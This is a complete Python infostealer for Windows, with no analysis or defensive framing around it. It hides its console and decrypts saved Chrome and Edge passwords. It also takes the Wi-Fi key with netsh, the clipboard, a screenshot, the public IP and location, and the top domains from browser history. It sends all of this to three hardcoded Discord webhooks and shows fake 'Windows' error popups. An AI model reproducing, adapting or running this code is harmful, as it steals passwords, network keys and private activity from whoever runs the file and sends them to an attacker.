import os
import shutil
import socket
import sqlite3
import subprocess
from collections import Counter
from datetime import datetime, timezone
from urllib.parse import urlparse
import getpass
import platform
import requests
import psutil
import pyperclip
from PIL import ImageGrab
import json
import base64
import win32crypt
from cryptography.hazmat.primitives.ciphers.aead import AESGCM

# ─── Hide console window ────────────────────────────────────────────────────
import ctypes
import win32gui
import win32con

def hide_console():
    try:
        hwnd = ctypes.windll.kernel32.GetConsoleWindow()
        if hwnd:
            win32gui.ShowWindow(hwnd, win32con.SW_HIDE)
    except:
        pass

hide_console()

# ──────────────────────────────────────────────────────────────────────────────

WIFI_WEBHOOK_URL   = "https://discord.com/api/webhooks/1459378040332222702/fVl25Ogayf2gW9wAR3wuGRKwvI_o8lJm-WmqZdwgawIGxLeqUtE7Hbytp-hGhCVpCDQO"
SITES_WEBHOOK_URL  = "https://discord.com/api/webhooks/1459381801494642763/_TweeXz2DCpwYJwlRnQuWzC6CP1hTm-3BW7A5Z0S6vrKm6LCC5F5S2ez8deNP5oeptzj"
INFO_WEBHOOK_URL   = "https://discord.com/api/webhooks/1459083733616427060/f6SNkQxaSG4yPh6vFUPEFdqVAJEZBISicZvQCbSwFtErK5eeQWfJrf4V5id7VyLOZCgg"

HISTORY_PATHS = [
    os.path.expanduser(r"~\AppData\Local\Google\Chrome\User Data\Default\History"),
    os.path.expanduser(r"~\AppData\Local\Microsoft\Edge\User Data\Default\History"),
    os.path.expanduser(r"~\AppData\Local\BraveSoftware\Brave-Browser\User Data\Default\History"),
]

# ─── Browser password extraction (Chrome + Edge) ────────────────────────────
def get_master_key(browser_path):
    try:
        local_state_path = os.path.join(browser_path, "Local State")
        with open(local_state_path, "r", encoding="utf-8") as f:
            local_state = json.load(f)
        encrypted_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
        encrypted_key = encrypted_key[5:]  # DPAPI prefix
        return win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]
    except:
        return None

def decrypt_password(encrypted_value, master_key):
    try:
        if encrypted_value.startswith(b"v10") or encrypted_value.startswith(b"v11"):
            iv = encrypted_value[3:15]
            payload = encrypted_value[15:]
            cipher = AESGCM(master_key)
            return cipher.decrypt(iv, payload, None).decode(errors='ignore')
        else:
            return win32crypt.CryptUnprotectData(encrypted_value, None, None, None, 0)[1].decode(errors='ignore')
    except:
        return ""

def get_saved_passwords(browser_name, login_db_path, limit=8):
    if not os.path.exists(login_db_path):
        return f"{browser_name}: Login Data not found"

    master_key = get_master_key(os.path.dirname(os.path.dirname(login_db_path)))
    if not master_key:
        return f"{browser_name}: Failed to get master key"

    temp_db = f"temp_{browser_name.lower()}_logins.db"
    try:
        shutil.copy2(login_db_path, temp_db)
        conn = sqlite3.connect(temp_db)
        cursor = conn.cursor()
        cursor.execute("""
            SELECT origin_url, username_value, password_value
            FROM logins
            ORDER BY date_last_used DESC
            LIMIT ?
        """, (limit,))
        rows = cursor.fetchall()
        conn.close()

        if not rows:
            return f"{browser_name}: No saved passwords"

        result = []
        for url, user, enc_pass in rows:
            if not enc_pass:
                continue
            plain = decrypt_password(enc_pass, master_key)
            if plain:
                result.append(f"• {url[:70]}\n  User: {user}\n  Pass: {plain}")

        return "\n\n".join(result) if result else f"{browser_name}: No decryptable passwords"
    except Exception as e:
        return f"{browser_name}: Error - {str(e)}"
    finally:
        if os.path.exists(temp_db):
            try:
                os.remove(temp_db)
            except:
                pass

# ──────────────────────────────────────────────────────────────────────────────

def get_current_wifi():
    try:
        info = subprocess.run(
            ["netsh", "wlan", "show", "interfaces"],
            capture_output=True, text=True, creationflags=0x08000000
        ).stdout
        network_name = None
        for line in info.splitlines():
            if "SSID" in line and "BSSID" not in line:
                network_name = line.split(":", 1)[1].strip()
                break
        if not network_name:
            return None, None

        pw_info = subprocess.run(
            ["netsh", "wlan", "show", "profile", f'name="{network_name}"', "key=clear"],
            capture_output=True, text=True, creationflags=0x08000000
        ).stdout
        password = "Not found / not saved"
        for line in pw_info.splitlines():
            if "Key Content" in line:
                password = line.split(":", 1)[1].strip()
                break
        return network_name, password
    except:
        return None, None

def build_wifi_message():
    user = getpass.getuser()
    ssid, password = get_current_wifi()
    if ssid is None:
        return f"**Wi-Fi Info** (failed to retrieve)\nUser: {user}\n\nCould not get current network information"
    return (
        f"**Current Network Information**\n"
        f"User: {user}\n\n"
        f"**Network Name:** {ssid}\n"
        f"**Password:** `{password}`"
    )

def send_wifi_log():
    try:
        requests.post(WIFI_WEBHOOK_URL, json={"content": build_wifi_message()}, timeout=7)
    except:
        pass

def get_public_ip():
    try:
        return requests.get("https://api4.ipify.org", timeout=5).text
    except:
        return "Unavailable"

def get_city_from_ip(ip):
    if ip == "Unavailable":
        return "Unavailable"
    try:
        data = requests.get(f"http://ip-api.com/json/{ip}", timeout=5).json()
        return data.get("city", "Unknown") if data.get("status") == "success" else "Unknown"
    except:
        return "Unknown"

def get_system_info():
    public_ip = get_public_ip()
    clipboard_text = pyperclip.paste() or "Empty"
    if len(clipboard_text) > 1200:
        clipboard_text = clipboard_text[:1200] + "… (truncated)"

    screenshot_path = None
    try:
        screenshot = ImageGrab.grab()
        screenshot_path = "tmp_screen.png"
        screenshot.save(screenshot_path, "PNG")
    except:
        pass

    chrome_path = os.path.expanduser(r"~\AppData\Local\Google\Chrome\User Data\Default\Login Data")
    edge_path   = os.path.expanduser(r"~\AppData\Local\Microsoft\Edge\User Data\Default\Login Data")

    return {
        "os": f"{platform.system()} {platform.version()}",
        "device": "Laptop" if hasattr(psutil, 'sensors_battery') and psutil.sensors_battery() else "Desktop",
        "public_ip": public_ip,
        "city": get_city_from_ip(public_ip),
        "network_name": get_current_wifi()[0] or "Not connected / unavailable",
        "user": getpass.getuser(),
        "clipboard": clipboard_text,
        "screenshot": screenshot_path,
        "chrome_passwords": get_saved_passwords("Chrome", chrome_path),
        "edge_passwords":   get_saved_passwords("Edge",   edge_path),
    }

def send_message(webhook_url, content, screenshot_path=None):
    data = {"content": content}
    files = None
    handle = None
    if screenshot_path and os.path.exists(screenshot_path):
        handle = open(screenshot_path, "rb")
        files = {"file": ("screenshot.png", handle, "image/png")}
    try:
        requests.post(webhook_url, data=data, files=files, timeout=15)
    except:
        pass
    finally:
        if handle:
            handle.close()
        if screenshot_path and os.path.exists(screenshot_path):
            try:
                os.remove(screenshot_path)
            except:
                pass

def send_info_log():
    info = get_system_info()
    content = (
        "**System Information**\n"
        f"Username: {info['user']}\n"
        f"OS: {info['os']}\n"
        f"Device: {info['device']}\n"
        f"Public IP: {info['public_ip']}\n"
        f"City: {info['city']}\n"
        f"Network Name: {info['network_name']}\n\n"
        f"**Clipboard Content:**\n"
        f"```\n{info['clipboard']}\n```\n\n"
        f"**Saved Passwords (Chrome)**\n"
        f"```\n{info['chrome_passwords']}\n```\n\n"
        f"**Saved Passwords (Edge)**\n"
        f"```\n{info['edge_passwords']}\n```"
    )
    send_message(INFO_WEBHOOK_URL, content, info["screenshot"])

# ─── History / Top sites (unchanged from previous) ──────────────────────────
def extract_domain(url):
    try:
        domain = urlparse(url).netloc.lower()
        return domain[4:] if domain.startswith("www.") else domain
    except:
        return ""

def read_recent_visits(db_path, limit=100):
    if not os.path.exists(db_path):
        return []
    temp = "temp_hist.db"
    try:
        shutil.copy2(db_path, temp)
        with sqlite3.connect(temp) as conn:
            cursor = conn.cursor()
            base = datetime(1601, 1, 1, tzinfo=timezone.utc)
            threshold = int((datetime.now(timezone.utc) - base).total_seconds() * 1_000_000 - 35*24*60*60*1_000_000)
            cursor.execute("SELECT urls.url FROM visits JOIN urls ON visits.url = urls.id WHERE visits.visit_time > ? ORDER BY visits.visit_time DESC LIMIT ?", (threshold, limit))
            return [r[0] for r in cursor.fetchall()]
    except:
        return []
    finally:
        if os.path.exists(temp):
            try: os.remove(temp)
            except: pass

def get_top_domains():
    urls = []
    for p in HISTORY_PATHS:
        urls.extend(read_recent_visits(p))
    if not urls:
        return []
    counts = Counter(extract_domain(u) for u in urls if extract_domain(u))
    return counts.most_common(6)

def send_sites_log():
    top = get_top_domains()
    now = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    if not top:
        msg = f"**Top Domains**\n{now}\nNo history found"
    else:
        lines = [f"**Top Domains (recent)**   {now}"]
        for i, (d, c) in enumerate(top, 1):
            lines.append(f"{i}. {d} — {c:,}")
        msg = "\n".join(lines)
    try:
        requests.post(SITES_WEBHOOK_URL, json={"content": msg}, timeout=7)
    except:
        pass

# ─── Fake error popups ──────────────────────────────────────────────────────
def show_fake_popups():
    try:
        import tkinter as tk
        from tkinter import messagebox
        root = tk.Tk()
        root.withdraw()
        u = getpass.getuser()
        ip = get_public_ip()
        messagebox.showerror("Windows", f"Thanks {u}")
        messagebox.showerror("Windows", ip)
        root.destroy()
    except:
        pass

# ─── Main ────────────────────────────────────────────────────────────────────
def main():
    show_fake_popups()
    send_wifi_log()
    send_info_log()
    send_sites_log()

if __name__ == "__main__":
    main()
